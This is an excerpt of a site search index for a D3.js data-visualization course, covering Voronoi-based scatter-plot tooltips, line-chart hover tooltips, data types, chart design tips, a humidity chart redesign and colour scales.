<pre><code>tooltip.style(\"transform\", `translate(`\n  + `calc( -50% + ${x}px),`\n  + `calc(-100% + ${y}px)`\n  + `)`)\n</code></pre> <p>Lastly, we'll make our tooltip visible and hide it when we mouse out of our dot.</p> <pre><code>  tooltip.style(\"opacity\", 1)\n}\n\nfunction onMouseLeave() {\n  tooltip.style(\"opacity\", 0)\n}\n</code></pre> <p>Nice! Adding a tooltip was much faster the second time around, wasn't it?</p> <p></p> <p>Those tiny dots are hard to hover over, though. The small hover target makes us focus really hard to move our mouse exactly over a point. To make things worse, our tooltip disappears when moving between points, making the whole interaction a little jerky.</p> <p>Don't worry! We have a very clever solution to this problem.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.04/scatter-plot/#voronoi","title":"Voronoi","text":"<p>Let's talk briefly about voronoi diagrams. For every location on our scatter plot, there is a dot that is the closest. A voronoi diagram partitions a plane into regions based on the closest point. Any location within each of these parts agrees on the closest point.</p> <p>Voronoi are useful in many fields \u2014 from creating art to detecting neuromuscular diseases to developing predictive models for forest fires.</p> <p>Let's look at what our scatter plot would look like when split up with a voronoi diagram.</p> <p></p> <p>See how each point in our scatter plot is inside of a cell? If you chose any location in that cell, that point would be the closest.</p> <p>There is a voronoi generator built into the main d3 bundle: <code>d3-delaunay</code>.</p> <p>Let's create our own diagram! Let's add some code at the end of the <code>Draw data</code> step, right before the <code>Draw peripherals</code> step. Instead of creating a voronoi generator, we'll create a new Delaunay triangulation. A delaunay triangulation is a way to join a set of points to create a triangular mesh. To create this, we can pass <code>d3.Delaunay.from()</code> three parameters:</p> <ol> <li>our dataset,</li> <li>an x accessor function, and</li> <li>a y accessor function.</li> </ol> <pre><code>  const delaunay = d3.Delaunay.from(\n    dataset,\n    d =&gt; xScale(xAccessor(d)),\n    d =&gt; yScale(yAccessor(d)),\n  )\n</code></pre> <p>Now we want to turn our delaunay triangulation into a voronoi diagram -- thankfully our triangulation has a <code>.voronoi()</code> method.</p> <pre><code>  const voronoi = delaunay.voronoi()\n  ```\n\nLet's bind our data and add a `&lt;path&gt;` for each of our data points with a class of \"voronoi\" (for styling with our `styles.css` file).\n\n```javascript\nbounds.selectAll(\".voronoi\")\n  .data(dataset)\n  .join(\"path\")\n    .attr(\"class\", \"voronoi\")\n</code></pre> <p>We can create each path's <code>d</code> attribute string by passing <code>voronoi.renderCell()</code> the index of our data point.</p> <pre><code>bounds.selectAll(\".voronoi\")\n    // ...\n    .attr(\"d\", (d,i) =&gt; voronoi.renderCell(i))\n</code></pre> <p>Lastly, let's give our paths a <code>stroke</code> value of <code>salmon</code> so that we can look at them.</p> <pre><code>bounds.selectAll(\".voronoi\")\n    // ...\n    .attr(\"stroke\", \"salmon\")\n</code></pre> <p>Now when we refresh our webpage, our scatter plot will be split into voronoi cells!</p> <p></p> <p>Hmm, our voronoi diagram is wider and shorter than our chart. This is because it has no concept of the size of our bounds, and is using the default size of <code>960</code> pixels wide and <code>500</code> pixels tall, which we can see if we log out our <code>voronoi</code> object.</p> <p></p> <p>Let's specify the size of our diagram by setting our <code>voronoi</code>'s <code>.xmax</code> and <code>.ymax</code> values (before we draw our <code>&lt;path&gt;</code>s).</p> <pre><code>const voronoi = delaunay.voronoi()\nvoronoi.xmax = dimensions.boundedWidth\nvoronoi.ymax = dimensions.boundedHeight\n</code></pre> <p>Voila! Now our diagram is the correct size.</p> <p></p> <p>What we want is to capture hover events for our paths instead of an individual dot. This will be much easier to interact with because of the contiguous, large hover targets.</p> <p>Let's remove that last line where we set the <code>stroke</code> (<code>.attr(\"stroke\", \"salmon\")</code>) so our voronoi cells are invisible. Next, we'll update our interactions, starting by moving our <code>mouseenter</code> and <code>mouseleave</code> events from the dots to our voronoi paths.</p> <p>A&gt;Note that the mouse events on our dots won't be triggered anymore, since they're covered by our voronoi paths.</p> <pre><code>bounds.selectAll(\".voronoi\")\n    // ...\n    .on(\"mouseenter\", onMouseEnter)\n    .on(\"mouseleave\", onMouseLeave)\n</code></pre> <p>When we refresh our webpage, notice how much easier it is to target a specific dot!</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.04/scatter-plot/#changing-the-hovered-dots-color","title":"Changing the hovered dot's color","text":"<p>Now that we don't need to directly hover over a dot, it can be a bit unclear which dot we're getting data about. Let's make our dot change color and grow on hover.</p> <p>The naive approach would involve selecting the corresponding circle and changing its fill. Note that d3 selection objects have a <code>.filter()</code> method that mimics a native Array's.</p> <pre><code>function onMouseEnter(event, d) {\n  bounds.selectAll(\"circle\")\n    .filter(datum =&gt; datum == d)\n      .style(\"fill\", \"maroon\")\n</code></pre> <p>However, we'll run into an issue here. Remember that SVG elements' z-index is determined by their position in the DOM. We can't change our dots' order easily on hover, so any dot drawn after our hovered dot will obscure it.</p> <p></p> <p>Instead, we'll draw a completely new dot which will appear on top.</p> <pre><code>function onMouseEnter(event, d) {\n  const dayDot = bounds.append(\"circle\")\n      .attr(\"class\", \"tooltipDot\")\n      .attr(\"cx\", xScale(xAccessor(d)))\n      .attr(\"cy\", yScale(yAccessor(d)))\n      .attr(\"r\", 7)\n      .style(\"fill\", \"maroon\")\n      .style(\"pointer-events\", \"none\")\n</code></pre> <p>Let's remember to remove this new dot on mouse leave.</p> <pre><code>function onMouseLeave() {\n  d3.selectAll(\".tooltipDot\")\n    .remove()\n</code></pre> <p>Now when we trigger a tooltip, we can see our hovered dot clearly!</p> <p></p> <p>Making a tooltip for our scatter plot was tricker than expected, but we saw how important encouraging interaction can be. When our hover targets were small, it felt like work to get more information about a specific point. But now that we're using voronoi cells, interacting with our chart is almost fun!</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.04/scatter-plot/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_04/lesson_04.05/line-chart/","title":"Line chart","text":"<p>Let's go through one last example for adding tooltips. So far, we've added tooltips to individual elements (bars, circles, and paths). Adding a tooltip to a timeline is a bit different.</p> <p>In this section, we're aiming to add a tooltip to our line chart like this:</p> <p></p> <p>Instead of catching hover events for individual elements, we want to display a tooltip whenever a user is hovering anywhere on the chart. Therefore, we'll want an element that spans our entire bounds.</p> <p></p> <p>To start coding up our Set up interactions step, let's create a <code>&lt;rect&gt;</code>\u00a0that covers our\u00a0bounds\u00a0and add our mouse event listeners to it. This time we'll want to listen for <code>mousemove</code>\u00a0events instead of\u00a0<code>mouseenter</code> events\u00a0because we'll want to update the tooltip's position when a reader moves their mouse around the chart.</p> <p>A&gt;Note that we don't need to define our <code>&lt;rect&gt;</code>'s <code>x</code> or <code>y</code> attributes because they both default to <code>0</code>.</p> <pre><code>const listeningRect = bounds.append(\"rect\")\n    .attr(\"class\", \"listening-rect\")\n    .attr(\"width\", dimensions.boundedWidth)\n    .attr(\"height\", dimensions.boundedHeight)\n    .on(\"mousemove\", onMouseMove)\n    .on(\"mouseleave\", onMouseLeave)\n</code></pre> <p>Perfect! We can see that our <code>listeningRect</code>, defaulted to a black fill, covers our entire bounds.</p> <p></p> <p>Let's add a rule to <code>styles.css</code> so we can see our chart again.</p> <pre><code>.listening-rect {\n    fill: transparent;\n}\n</code></pre> <p>Great! Now we can set up our <code>tooltip</code> variable and <code>onMouseMove</code> and <code>onMouseLeave()</code> functions (back in our <code>line.js</code> file).</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nfunction onMouseMove(event) {\n}\n\nfunction onMouseLeave() {\n}\n</code></pre> <p>Let's start fleshing out <code>onMouseMove</code> \u2014 how will we know the location on our line that we are hovering over? The passed parameters we used previously (<code>datum</code>, <code>index</code>, and <code>nodes</code>) won't be helpful here, and <code>this</code> will just point us at the listener rect element.</p> <p>When an event listener is invoked, the d3-selection library sets a global <code>d3.event</code>. <code>d3.event</code> will refer to the currently triggered event and will be reset when the event listener is done. During the event listener handler, we also get access to a <code>d3.mouse()</code> function which will return the <code>x</code>, <code>y</code> coordinates of the mouse event, relative to a specified container.</p> <p>Let's see what that would look like in action and pass our listener container to <code>d3.mouse()</code>.</p> <pre><code>function onMouseMove(event) {\n    const mousePosition = d3.pointer(event)\n    console.log(mousePosition)\n</code></pre> <p>Now we can see our mouse position as an <code>[x,y]</code> array when we move our mouse around the chart.</p> <p>{width=50%} </p> <p>Test it out \u2014 what do the numbers look like when you hover over the top left of the chart? What about the bottom right?</p> <p>{pagebreak}</p> <p>Great, but in order to show the tooltip next to an actual data point, we need to know which point we're closest to. First, we'll need to figure out what date we're hovering over \u2014 how do we convert an x position into a date? So far, we've only used our scales to convert from the data space (in this case, JavaScript date objects) to the pixel space.</p> <p>Thankfully, d3 scales make this very simple! We can use the same <code>xScale()</code> we've used previously, which has an <code>.invert()</code> method. <code>.invert()</code> will convert our units backwards, from the <code>range</code> to the <code>domain</code>.</p> <p>Let's pass the x position of our mouse (<code>mousePosition[0]</code>) to the <code>.invert()</code> method of our <code>xScale()</code>.</p> <pre><code>const mousePosition = d3.mouse(this)\nconst hoveredDate = xScale.invert(mousePosition[0])\n</code></pre> <p>Okay great, now know what date we're hovering over \u2014 let's figure out how to find the closest data point.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.05/line-chart/#d3leastindex","title":"d3.leastIndex()","text":"<p>If you ever need to know where a variable will fit in a sorted list, <code>d3.leastIndex()</code> can help you out. <code>d3.leastIndex()</code> requires two parameters:</p> <ol> <li>an array (in this case, our dataset), and</li> <li>an optional comparator function.</li> </ol> <p>The comparator function will take two adjacent items in the passed array and return a numerical value. <code>d3.leastIndex()</code> will take those returned values and return the index of the smallest value.</p> <p>Let's look at a few examples to get that description to click:</p> <p><code>d3.leastIndex([100, 0, 10], (a,b) =&gt; a - b)</code> would create an array of values that looks like <code>[100, -10]</code>.</p> <p>{width=80%} </p> <p>This expression would then return <code>1</code> because the second item in the array of values is the smallest (remember, the second item is referred to as <code>1</code> when we're looking at zero-indexed indices).</p> <p><code>d3.leastIndex([100, 0, 10], (a,b) =&gt; b - a)</code> would create the array <code>[-100, 10]</code></p> <p>{width=80%} </p> <p>This expression would then return <code>0</code>, because the first item of the array of values is the smallest.</p> <p>Let's try it out \u2014 we'll first create a function to find the distance between the hovered point and a datapoint. We don't care if the point is before or after the hovered date, so we'll use <code>Math.abs()</code> to convert that distance to an absolute distance.</p> <pre><code>const getDistanceFromHoveredDate = d =&gt; Math.abs(\n  xAccessor(d) - hoveredDate\n)\n</code></pre> <p>Then we can use that function to compare the two data points in our <code>d3.leastIndex()</code> comparator function. This will create an array of distances from the hovered point, and we'll get the index of the closest data point to our hovered date.</p> <pre><code>const closestIndex = d3.leastIndex(dataset, (a, b) =&gt; (\n  getDistanceFromHoveredDate(a) - getDistanceFromHoveredDate(b)\n))\n</code></pre> <p>Next, we need to grab the data point at that index.</p> <pre><code>const closestDataPoint = dataset[closestIndex]\n</code></pre> <p>Let's <code>console.table(closestDataPoint)</code> to make sure we're grabbing the right value.</p> <p></p> <p>When we move our mouse to the left of our chart, we should see dates close to the beginning of our dataset, which increase as we move right.</p> <p>Perfect! Now let's grab the closest <code>x</code> and <code>y</code> values using our accessor functions \u2014 these will come in handy when we're updating our tooltip.</p> <pre><code>const closestXValue = xAccessor(closestDataPoint)\nconst closestYValue = yAccessor(closestDataPoint)\n</code></pre> <p>We can use our <code>closestXValue</code> to set the date in our tooltip. Let's also format it nicely using <code>d3.timeFormat()</code> with the same specifier string we used for our scatter plot.</p> <pre><code>const formatDate = d3.timeFormat(\"%B %A %-d, %Y\")\ntooltip.select(\"#date\")\n    .text(formatDate(closestXValue))\n</code></pre> <p>Next up, we can set the temperature value in our tooltip \u2014 this time our formatter string will also add a <code>\u00b0F</code> suffix to clarify.</p> <pre><code>const formatTemperature = d =&gt; `${d3.format(\".1f\")(d)}\u00b0F`\ntooltip.select(\"#temperature\")\n    .text(formatTemperature(closestYValue))\n</code></pre> <p>Lastly, we'll want to grab the <code>x</code> and <code>y</code> position of our closest point, shift our tooltip, and hide/show our tooltip appropriately. This should look like what we've done in the past two sections.</p> <pre><code>  const x = xScale(closestXValue)\n      + dimensions.margin.left\n  const y = yScale(closestYValue)\n      + dimensions.margin.top\n\n  tooltip.style(\"transform\", `translate(`\n      + `calc( -50% + ${x}px),`\n      + `calc(-100% + ${y}px)`\n      + `)`)\n\n  tooltip.style(\"opacity\", 1)\n}\n\nfunction onMouseLeave() {\n  tooltip.style(\"opacity\", 0)\n}\n</code></pre> <p>Wonderful! When we refresh our webpage, we can see a tooltip that will match the horizontal position of our cursor, while sitting just above our line.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.05/line-chart/#extra-credit","title":"Extra credit","text":"<p>You may notice an issue that we had before with our scatter plot \u2014 it's not immediately clear what point we're hovering over. Let's solve this by positioning a <code>&lt;circle&gt;</code> over the spot we're hovering \u2014 this should make the interaction clearer and the dataset more tangible.</p> <p>First, we need to create our circle element \u2014 let's draw it right after we create our <code>tooltip</code> variable.</p> <pre><code>const tooltip = d3.select(\"#tooltip\")\nconst tooltipCircle = bounds.append(\"circle\")\n    .attr(\"r\", 4)\n</code></pre> <p>In our <code>styles.css</code> file, let's add some styles and hide it with an <code>opacity</code> of <code>0</code> to start.</p> <pre><code>.tooltip-circle {\n    stroke: #af9358;\n    fill: white;\n    stroke-width: 2;\n    opacity: 0;\n    pointer-events: none;\n}\n</code></pre> <p>Now, right after we position our tooltip in <code>onMouseEnter()</code>, we can also position our <code>tooltipCircle</code> and give it an <code>opacity</code> of <code>1</code>.</p> <pre><code>tooltipCircle\n    .attr(\"cx\", xScale(closestXValue))\n    .attr(\"cy\", yScale(closestYValue))\n    .style(\"opacity\", 1)\n}\n</code></pre> <p>Lastly, we'll hide it in <code>onMouseLeave()</code> after we hide our tooltip.</p> <pre><code>function onMouseLeave() {\n  tooltip.style(\"opacity\", 0)\n  tooltipCircle.style(\"opacity\", 0)\n}\n</code></pre> <p>Voila! Now we should see a circle under our tooltip, right over the \"hovered\" point.</p> <p></p> <p>Give it a spin and feel out the difference. Putting yourself in the user's shoes, you can see how highlighting the hovered data point makes the data feel more tangible.</p>"},{"location":"datav/codes/code/course-full/module_04/lesson_04.05/line-chart/#final-code-for-this-lesson","title":"Final code for this lesson","text":""},{"location":"datav/codes/code/course-full/module_04/lesson_04.06/exercise-week-5/","title":"This week's exercise","text":"<p>Awesome work getting through all of that tricky interaction code! During this week, add interactions to one of the custom charts you created in our previous exercises!</p> <p>Choose whichever chart you are most excited about making interactive. Here are a few suggestions:</p> <ul> <li>tweak your line chart so that it draws a line to the y axis when you hover near a point</li> <li>tweak your scatter plot so that a circle turns into a square when you click on it</li> <li>add an info section next to your histogram that shows information about the last bar you clicked</li> </ul> <p>Now, go over the same steps we went through this week to add interactions to one of your custom charts.</p> <p>If you get stuck, watch this week's videos again or post a question inline or on the Discord channel. Good luck! We're rooting for you!</p> <p>And once you're finished, show off your wonderful custom visualization on Twitter or on the Discord! We'd love to see it!</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.00/data-visualization-basics/","title":"Data Visualization Basics","text":"<p>Now that we're comfortable with how to create a chart, we should zoom out a bit and talk about what chart to create. So far, we've created a line, scatter, and bar chart, but there are many more basic types to choose from, as well as charts that don't fall into a simple category.</p> <p>{width=50%} </p> <p>The format of our chart is the largest factor in what information our users take away \u2014 even given the same dataset! Let's look at the charts we've made with our weather data.</p> <p>In Module 1, we charted a timeline of maximum temperatures. Looking at this chart, we could see how the temperature changed over time - how consistent was the weather day to day or season to season?</p> <p></p> <p>In Module 2, we created a scatter plot with two metrics. Looking at this chart, we could see at how humidity and dew point are related, answering questions such as: does a high humidity also meant a high dew point?</p> <p>{width=50%} </p> <p>In Module 3, we created a histogram of humidity values. Looking at this chart, we could see how much variety there was in a single metric \u2014 do most days stay around the same humidity level, or are they all very different?</p> <p>{width=70%} </p> <p>Even with these three examples and a limited dataset, we can see how the type of chart will enable the user to answer very different questions. There are also many types of charts \u2014 thus, answering the question What type of chart is best? is both important and overwhelmingly open-ended. Don't worry, though \u2014 this module will equip you with the tools to make that decision, and quickly!</p> <p>Let's start at the beginning \u2014 with our data.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.01/types-of-data/","title":"Types of data","text":"<p>Given a dataset, the first task is to determine the structure of the available metrics. Let's look at the first item of our weather dataset.</p> <p>{width=50%} </p> <p>There are many different values here, but two basic types: strings and numbers. These two types can roughly be split (respectively) into two basic types of data: qualitative and quantitative.</p> <p>Qualitative data (our strings) does not have a numerical value, but it can be put into categories. For example, <code>precipType</code> can either have a value of \"rain\" or \"snow\".</p> <p>{width=70%} </p> <p>Quantitative data (our numbers) is numerical and can be measured objectively. For example, <code>temperatureMax</code> has values ranging from 10\u00b0F to 100\u00b0F.</p> <p>{width=70%} </p> <p>Both of these types of data can be broken down even further.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.01/types-of-data/#qualitative-data","title":"Qualitative Data","text":"<p>Binary data can be placed into only two categories.</p> <p>{width=70%} </p> <p>For example, if our weather data had an did rain metric that was either true or false, that metric would be binary.</p> <p>Nominal data can be placed multiple categories that don't have a natural order.</p> <p>{width=70%} </p> <p>For example, our weather data has the metric icon with values such as <code>clear-day</code> and <code>wind</code> \u2014 these values can't be ordered.</p> <p>Ordinal data can be placed in multiple categories with a natural order.</p> <p>{width=70%} </p> <p>For example, if our weather data instead represented wind speed values with <code>not windy</code>, <code>somewhat windy</code>, and <code>very windy</code>, that metric would be ordinal.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.01/types-of-data/#quantitative-data","title":"Quantitative Data","text":"<p>Discrete data has numerical values that can't be interpolated between, such as a metric that can only be represented by an integer (whole number).</p> <p>{width=70%} </p> <p>A classic example is number of kids \u2014 a family can have 1 or 2 kids, but not 1.5 kids. With weather data, a good example would be number of tornados that happened.</p> <p>Continuous data has numerical values that can be interpolated between. Usually a metric will fall under this category \u2014 for example, max temperature can be 50\u00b0F or 51\u00b0F or 50.5\u00b0F.</p> <p>{width=70%} </p> <p>This categorization is just one way to group types of data. There are other ways, but this categorization is common and a handy place to start. When you are looking at a new dataset, familiarize yourself by categorizing each metric.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.02/ways-to-visualize-a-metric/","title":"Ways to visualize a metric","text":"<p>Now that we understand the metrics that we're working with, we need to decide how to represent them visually. Keep in mind that we, as humans, are able to judge some dimensions more quickly or precisely than others.</p> <p>Let's go through some possible ways we could represent temperature, as an example.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.02/ways-to-visualize-a-metric/#size","title":"Size","text":"<p>{width=70%} </p> <p>We could represent temperature by sizing an element: larger for higher temperatures and smaller for lower temperatures. We could also scale just the height or the width \u2014 when making our histograms, we created taller bars for higher numbers.</p> <p>Humans are very fast and precise at perceiving size differences (especially height or width) between objects, making it a good choice when the exact differences matter.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.02/ways-to-visualize-a-metric/#position","title":"Position","text":"<p>{width=70%} </p> <p>We could represent temperature by moving an element: horizontally, vertically, even diagonally. For example, we could make a scatter plot with lower temperatures to the left and higher temperatures to the right.</p> <p>Like size, humans are very fast and precise at comparing horizontal and vertical positions, making it a great choice when precision matters.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.02/ways-to-visualize-a-metric/#color","title":"Color","text":"<p>{width=70%} </p> <p>We could represent temperature by giving our elements a different color. For example, we could make a scatter plot with dots colored from blue (lower temperatures) to red (higher temperatures). Choosing colors can be overwhelming \u2014 don't worry, we have a section to help with just that coming up in this Chapter.</p> <p>Humans are less adept at distinguishing two colors than distinguishing two sizes or two positions. However, we can more easily average colors together, making color a good choice for visualizations where the overall picture matters. If both the specific values and the overall picture are important, try showing the overall picture and progressively surfacing exact values with tooltips or a companion table.</p> <p>There are other dimensions (for example, orientation or pattern), but these basic ones will get you thinking on the right path. These dimensions might remind you of a concept we've been using: scales. Scales have been helping us translate data values into a physical dimension: for example, temperature into height of a bar  in pixels.</p> <p>A&gt;When you have a dataset that is chock full of metrics like our weather data, it often isn't ideal to visualize all of it in one chart. Focused charts are the most effective \u2014 sticking with 2-4 dimensions will help the user focus on what's important without being overwhelmed.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.02/ways-to-visualize-a-metric/#putting-it-together","title":"Putting it together","text":"<p>It can be tempting to jump right in and say \"Oh I know, I'm going to make a bar chart!\" But let's investigate further: what is a bar chart made out of? A bar chart is made up of bars that vary in size (height) and are spread our horizontally (position).</p> <p>There is a whole world of chart types that haven't yet been created! Now that you have this framework, you'll be able to look at a dataset and brainstorm unique ways to visualize it.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.03/chart-design/","title":"Chart design","text":"<p>Now that you understand these basics, you have the tools you need to make effective and intuitive charts. Once you've decided on the what and the how, here are some tips for keeping those charts easy to read.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.03/chart-design/#simplify-simplify-simplify","title":"Simplify, simplify, simplify","text":"<p>Many chart libraries will include default styles in order to satisfy as many use cases as possible. This can create charts with more elements than are necessary. Fortunately, we don't need to rely on a library and can strip away as much as possible.</p> <p>After you finish creating a chart, give it a critical look and ask yourself, \"Is everything on here necessary?\" If the answer is no, remove the cruft! No need to overwhelm your reader.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.03/chart-design/#annotate-in-place","title":"Annotate in-place","text":"<p>It can be tempting to throw a legend next to a chart to clarify a color or size scale. While we should make sure to explain every part of our chart, ask yourself if you can label these elements directly. In-place annotations put the description as close as possible, which prevents forcing the reader to look back and forth between elements.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.03/chart-design/#add-enhancements-but-not-too-many","title":"Add enhancements, but not too many","text":"<p>As a corollary to the last two tips, check to see if you can enhance your chart to help create insights. For example, if the goal of your chart is to show trends, consider adding a trend or reference line to make any patterns more apparent.</p> <p></p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.04/example-redesign/","title":"Example redesign","text":"<p>Let's redesign a simple chart to see these tips in practice. The goal of this chart is to examine how humidity changes, depending on the time of year.</p> <p></p> <p></p> <p>For practice, take a minute and write down the ways you would improve on this chart, with our goal in mind.</p> <p>Goal: examine how humidity changes, depending on the time of year</p> <p>Ready to dive in? There is no \"correct\" way to improve on this chart, but we'll do our best to make it easier to digest quickly.</p> <p>The first problem we'll tackle is the noisiness of the data. While the daily dips and spikes may help answer other questions, they only distract from our goal of investigating seasonal trends. Let's downsample the data to one point per week and smooth our line using <code>d3.curveBasis()</code>.</p> <p>A&gt;If you're following along, we have a <code>downsampleData()</code> function at the bottom of the file that we can pass our <code>dataset</code>, <code>xAccessor</code>, and <code>yAccessor</code> and receive a downsampled dataset with weekly values.</p> <p>{pagebreak}</p> <p>A&gt;<code>d3.line()</code> has a method <code>.curve()</code> that can be passed a interpolation function. The default interpolation is linear: the line connects points directly. For a smoother line, check out the different interpolation options built in to d3 in the d3-shape documentation. Here, we're adding the code <code>.curve(d3.cuveBasis)</code> to diminish the importance of specific data points and give the reader an idea of the overall line shape.</p> <p></p> <p>Let's add the original points back in, in the form of small circles. We don't want to lose the granularity of the original data, even when we're getting the basic trend with the downsampled line.</p> <p>To prevent from drawing attention away from our trend line, we'll make these dots a lighter grey.</p> <p></p> <p>There's a lot going on right now! Let's simplify a bit and take out the grid marks and chart background. We'll also specify a smaller number of ticks (<code>.ticks(3)</code>) for our y axis \u2014 the extra ticks aren't giving any useful information since readers can easily extrapolate between values.</p> <p></p> <p>Revisiting our goal, we realize that we want to focus on trends based on the time of year. We're showing the months on our x axis, but we can do some work for the reader and highlight the different seasons. Let's block out each season with a <code>&lt;rect&gt;</code> underneath our main data elements.</p> <p></p> <p>While the legend is helpful, there are a few issues with it.</p> <ol> <li> <p>Both Spring and Fall are <code>white</code> because they are transitional seasons. This makes it unclear which is which on the chart.</p> </li> <li> <p>As we discussed earlier in the chapter, legends make the reader look back and forth between the chart and the legend.</p> </li> </ol> <p>To fix these issues, let's label the seasons directly on the chart instead of having an x axis.</p> <p></p> <p>Let's focus on the y axis. Rotated y axis labels are great \u2014 they're often the only way to fit the label to the side of our chart. However, the label is divorced from the values, and rotating text makes it harder to read.</p> <p>Instead, let's signify the units of our y axis by incorporating it into a phrase with our top y tick value. Human-readable labels can do some of the digesting work a reader has to do, hinting at how to interpret a number.</p> <p></p> <p>While we've made it easier to compare trends across seasons, it's not easy to conclude how the seasons compare in general. We could downsample our data and only display one point per season, but then we'd lose any insights from seasonal trends.</p> <p>Instead, let's add seasonal means as lines, which should enhance the chart but not take away from the main picture.</p> <p></p> <p></p> <p>Nice! Now we can easily see that the humidity is low in the Winter, but not as low as in the Spring. Let's look at two charts side-by-side.</p> <p></p> <p></p> <p>While both charts display the same data and can both be helpful, the final version is much more effective for our goal: to examine how humidity changes, depending on the time of year.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.05/color%20scales/","title":"Colors","text":"<p>One of the hardest parts of creating charts is choosing colors. The wrong colors can make a chart unappealing, ineffective, and, worst of all, impossible to read. This section will give you a good framework for choosing colors, important facts about human perception, and simple tips.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.05/color%20scales/#color-scales","title":"Color scales","text":"<p>When choosing a color scale, you first want to identify its purpose. Going back to what we know about data types, there are three basic use cases:</p> <ol> <li>Representing a category</li> <li>Representing a continuous metric</li> <li>Representing a diverging metric</li> </ol> <p></p> <p>Let's dive deeper into each of these.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.05/color%20scales/#1-representing-a-category","title":"1. Representing a category","text":"<p>The first two data types we talked about (binary and nominal) will be best represented with a categorical color scheme.</p> <p>Since our metric values don't have a natural order, we don't want to use a color scheme that has a natural order (like white to black).</p> <p>d3 has built-in color schemes in its d3-scale-chromatic library.</p> <p></p> <p>These categorical color schemes have been carefully designed to have enough contrast between colors. Each of these schemes is an array of colors \u2014 for example, to use the first scale in this list, we would access each color at its index in <code>d3.schemeCategory10</code>.</p> <p>A&gt;For categorical color schemes, it's helpful for each color to have a different descriptive name. For example, there might be two colors that could be described as \"blue\", which can be confusing to talk about.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.05/color%20scales/#2-representing-a-continuous-metric","title":"2. Representing a continuous metric","text":"<p>For metrics that are continuous, we'll want a way to interpolate in between color values. For example, we could represent humidity values with a color scale ranging from white to dark blue.</p> <p>d3-scale-chromatic's built-in continuous scales are visible under the Sequential section.</p> <p></p> <p>These are color scales instead of color schemes \u2014 <code>d3.interpolateBlues()</code> is a function instead of an array of colors. To get a color, we can give <code>d3.interpolateBlues()</code> a decimal in between <code>0</code> and <code>1</code> \u2014 <code>0</code> would return the leftmost color (a light gray) and <code>1</code> would give us the dark blue on the right. To put it in familiar terms, <code>d3.interpolateBlues()</code> is a scale with a domain of <code>[0,1]</code> and a range of <code>[light gray, dark blue]</code>.</p> <p>These single-hue scales a great for basic charts and charts with multiple color scales. However, sometimes the steps in between color values are too small and it becomes hard to distinguish between values. In this case, d3-scale-chromatic has many sequential color scales that cycle through another hue, increasing the difference between values.</p> <p></p> <p>We can see how much easier it is to tell the difference between colors 50% and 60% of the way through a single-hue scale (left) versus a multi-hue scale (right).</p> <p></p> <p>We also have a few cyclical color scales, which are great for metrics whose values \"wrap around\". For example, if we wanted to represent the time of year, we could use a cyclical color scale that has no natural beginning or end.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.05/color%20scales/#3-representing-a-diverging-metric","title":"3. Representing a diverging metric","text":"<p>Our sequential color scales get more visually clear as they approach the end of the scale. This is great to highlight values on the high end (for example, the highest humidity values will be the most visible).</p> <p>Sometimes, however, we want to highlight both the lowest and highest metric values. For example, if we're looking at temperature, we might want to highlight the coldest days as a bright blue and the hottest days as a bright red.</p> <p>Diverging scales start and end with very saturated/dark color and run through a less intense middle range.</p> <p></p> <p>We can see that we have both single-hue (per side) and multi-hue diverging scales. Again, it's helpful to cycle through more hues so users can pick up on smaller differences between metrics, but it can get overwhelming when we are already cycling through two hues. When getting a feel for color scales, try a few different options to get an idea for what will work in your specific scenario. This is not a one-size-fits-all decision.</p>"},{"location":"datav/codes/code/course-full/module_05/lesson_05.06/custom%20color%20scales/","title":"Custom color scales","text":""},{"location":"datav/codes/code/course-full/module_05/lesson_05.06/custom%20color%20scales/#custom-color-scales","title":"Custom color scales","text":"<p>Sometimes the built-in color scales don't cut it. Maybe you have specific colors that you want to work in, or you are going for a particular tone with your chart. No worries! We can make our own scales easily using d3-interpolate.</p> <p></p> <p>Let's say that we wanted to represent temperature values with a color, ranging from \"cyan\" to \"red\". There are several methods that we could use to interpolate between those two colors, including <code>d3.interpolateRgb()</code> and <code>d3.interpolateHsl()</code>.</p> <p>Let's make our own scale, running from \"cyan\" to \"tomato\" \u2014 all we need to do is pass our starting and ending color as separate parameters to <code>d3.interpolateHcl()</code>.</p> <p>A&gt;We'll talk about the difference between the different color spaces (rgb, hsl, hcl) in the next section.</p> <pre><code>d3.interpolateRgb(\"cyan\", \"tomato\")\n</code></pre> <p>That will give us this scale:</p> <p></p> <p>Our code has been started off with a few different custom scales.</p> <p></p> <p>If we open up the <code>draw-scales.js</code> file, we can test our own custom scales at the bottom. In the <code>index.html</code> file, we are importing other JavaScript files that list the built-in scale types and define a <code>drawColorRange()</code> function that creates an <code>&lt;svg&gt;</code> element with a <code>linear-gradient</code>.</p> <p>We also have a utility function, <code>addCustomScale()</code>, that accepts two parameters:</p> <ol> <li>the scale's name (which needs to be a string without spaces, since we're using it to create and reference an <code>id</code>), and</li> <li>a color scale (a function that returns a color when passed a value between <code>0</code> and <code>1</code>)</li> </ol> <p>We've already created a few custom scales \u2014 check out the first three which have the same range but use different color spaces for interpolation.</p> <p>We can also create new discrete color schemes. The last two custom scales are using a function called <code>interpolateWithSteps()</code> defined on 